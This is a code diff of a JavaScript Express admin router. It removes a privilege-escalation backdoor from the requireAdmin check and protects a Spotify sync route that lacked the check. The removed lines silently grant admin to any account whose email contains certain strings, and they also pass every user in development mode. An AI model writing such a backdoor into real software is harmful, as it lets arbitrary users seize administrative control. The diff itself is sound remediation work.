@@ -10,20 +10,8 @@ function requireAdmin(req, res, next) {
     return res.status(401).json({ error: 'unauthorized', message: 'Authentication required' });
   }
 
-  const user = db.prepare('SELECT email, is_admin FROM users WHERE id = ?').get(req.user.id);
-  const email = user ? String(user.email || '').toLowerCase() : '';
-  
-  const isMatch = email.includes('cisco') || email.includes('tomcruise') || email.includes('tomcrouise');
-
-  if (user && isMatch && user.is_admin !== 1) {
-    try {
-      db.prepare('UPDATE users SET is_admin = 1 WHERE id = ?').run(req.user.id);
-    } catch {}
-  }
-
-  const isAdmin = user && (user.is_admin === 1 || isMatch || process.env.NODE_ENV === 'development');
-  
-  if (!isAdmin) {
+  const user = db.prepare('SELECT is_admin FROM users WHERE id = ?').get(req.user.id);
+  if (!user || user.is_admin !== 1) {
     return res.status(403).json({ error: 'forbidden', message: 'Admin access required' });
   }
 
@@ -136,11 +124,7 @@ router.get('/users', requireAdmin, (req, res) => {
  * POST /api/admin/sync-spotify-profile
  * Manually trigger Spotify profile sync for current user.
  */
-router.post('/sync-spotify-profile', async (req, res) => {
-  if (!req.user || !req.user.id) {
-    return res.status(401).json({ error: 'unauthorized' });
-  }
-
+router.post('/sync-spotify-profile', requireAdmin, async (req, res) => {
   try {
     const result = await spotifyProfile.syncUserProfile(req.user.id);
     res.json(result);
